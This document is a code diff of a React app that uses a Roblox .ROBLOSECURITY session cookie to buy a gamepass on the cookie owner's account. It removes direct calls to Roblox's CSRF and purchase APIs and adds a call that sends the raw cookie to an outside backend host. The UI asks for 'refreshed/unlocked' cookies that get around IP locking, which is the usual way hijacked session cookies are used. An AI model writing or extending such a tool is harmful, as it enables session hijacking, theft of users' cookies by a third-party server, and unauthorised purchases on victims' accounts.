@@ -9,6 +9,9 @@ function App() {
   const [result, setResult] = useState(null);
   const [purchaseDetails, setPurchaseDetails] = useState(null);
 
+  // Use your backend URL
+  const BACKEND_URL = 'https://roblox-purchase-backend.vercel.app';
+
   const purchaseGamepass = async () => {
     if (!cookie || !gamepassId) {
       setResult({ type: 'error', message: 'Please enter both cookie and gamepass ID' });
@@ -20,82 +23,28 @@ function App() {
     setPurchaseDetails(null);
 
     try {
-      // Step 1: Get CSRF Token
-      const csrfResponse = await axios.post('https://auth.roblox.com/v2/logout', {}, {
-        headers: {
-          'Cookie': `.ROBLOSECURITY=${cookie}`,
-          'Content-Type': 'application/json'
-        }
+      // Single API call to your backend proxy
+      const response = await axios.post(`${BACKEND_URL}/api/proxy-purchase`, {
+        cookie: cookie.trim(),
+        gamepassId: gamepassId.trim()
       });
-      
-      const csrfToken = csrfResponse.headers['x-csrf-token'];
-      if (!csrfToken) {
-        throw new Error('Invalid cookie - Could not get CSRF token');
+
+      if (response.data.success) {
+        setResult({ type: 'success', message: 'Purchase completed successfully!' });
+        setPurchaseDetails(response.data.data);
+      } else {
+        setResult({ type: 'error', message: response.data.error });
       }
-
-      // Step 2: Get User Info
-      const userResponse = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-        headers: {
-          'Cookie': `.ROBLOSECURITY=${cookie}`
-        }
-      });
-      
-      const userId = userResponse.data.id;
-      const username = userResponse.data.name;
-
-      // Step 3: Get Gamepass Info
-      const productResponse = await axios.get(
-        `https://economy.roblox.com/v1/game-pass/${gamepassId}/product-info`,
-        {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`
-          }
-        }
-      );
-
-      const productData = productResponse.data;
-      
-      // Step 4: Execute Purchase
-      const purchaseData = {
-        expectedCurrency: 1,
-        expectedPrice: productData.Price,
-        expectedSellerId: productData.Creator.Id
-      };
-
-      const purchaseResponse = await axios.post(
-        `https://economy.roblox.com/v1/purchases/products/${productData.ProductId}`,
-        purchaseData,
-        {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'Content-Type': 'application/json',
-            'x-csrf-token': csrfToken
-          }
-        }
-      );
-
-      setResult({ type: 'success', message: 'Purchase completed successfully!' });
-      setPurchaseDetails({
-        username: username,
-        userId: userId,
-        gamepassName: productData.Name,
-        price: productData.Price,
-        transactionId: purchaseResponse.data.transactionId || 'N/A'
-      });
 
     } catch (error) {
       console.error('Purchase error:', error);
       
       let errorMessage = 'Purchase failed';
       
-      if (error.response?.data?.errors) {
-        errorMessage = error.response.data.errors[0]?.message || errorMessage;
-      } else if (error.response?.status === 401) {
-        errorMessage = 'Invalid or expired cookie. Please refresh your cookie.';
-      } else if (error.response?.status === 403) {
-        errorMessage = 'Access denied. Cookie may be IP-locked or invalid.';
-      } else if (error.response?.status === 400) {
-        errorMessage = 'Invalid gamepass ID or already owned.';
+      if (error.response?.data?.error) {
+        errorMessage = error.response.data.error;
+      } else if (error.code === 'ERR_NETWORK') {
+        errorMessage = 'Network error. Please check your connection.';
       } else {
         errorMessage = error.message;
       }
@@ -130,18 +79,7 @@ function App() {
           <strong>⚠️ Important: Use REFRESHED Cookie Only</strong>
           <p>
             This tool requires a <strong>refreshed/unlocked</strong> .ROBLOSECURITY cookie.
-            Regular cookies will fail due to IP locking. Use your cookie refresher first,
-            then paste the refreshed cookie below.
-          </p>
-        </div>
-
-        <div className="info-box">
-          <strong>📋 How It Works</strong>
-          <p>
-            1. Refresh your cookie using your cookie refresher<br/>
-            2. Paste the refreshed cookie below<br/>
-            3. Enter the gamepass ID<br/>
-            4. Click "Purchase Gamepass" - it processes instantly!
+            Regular cookies will fail due to IP locking.
           </p>
         </div>
 
@@ -155,14 +93,11 @@ function App() {
               <textarea
                 value={cookie}
                 onChange={(e) => setCookie(e.target.value)}
-                placeholder="_|WARNING:-DO-NOT-SHARE--YOUR-REFRESHED-COOKIE-HERE..."
+                placeholder="_|WARNING:-DO-NOT-SHARE..."
                 rows="4"
                 required
                 disabled={loading}
               />
-              <small className="helper-text">
-                Paste your REFRESHED cookie here (must be unlocked/IP-free)
-              </small>
             </div>
 
             <div className="form-group">
@@ -178,16 +113,9 @@ function App() {
                 required
                 disabled={loading}
               />
-              <small className="helper-text">
-                Found in URL: roblox.com/game-pass/<strong>12345678</strong>/Name
-              </small>
             </div>
 
-            <button 
-              type="submit" 
-              disabled={loading}
-              className="primary-button"
-            >
+            <button type="submit" disabled={loading} className="primary-button">
               {loading ? (
                 <>
                   <span className="spinner"></span>
